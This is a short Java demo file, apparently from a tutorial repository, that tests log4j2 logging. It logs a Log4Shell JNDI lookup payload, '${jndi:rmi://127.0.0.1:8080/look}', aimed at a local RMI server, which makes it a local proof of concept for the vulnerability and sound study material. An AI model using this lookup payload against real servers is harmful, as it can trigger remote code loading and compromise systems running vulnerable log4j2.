package learn.demo.日志.log4j2;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * @FileName: LogTest
 * @Author: code-fusheng
 * @Date: 2021/12/25 11:44 上午
 * @Version: 1.0
 * @Description: log日志测试
 */

public class LogTest {

    public static void main(String[] args) {

        Logger logger = LoggerFactory.getLogger("log4j2");
        logger.info("启动成功:{}", "${jndi:rmi://127.0.0.1:8080/look}");

    }

}
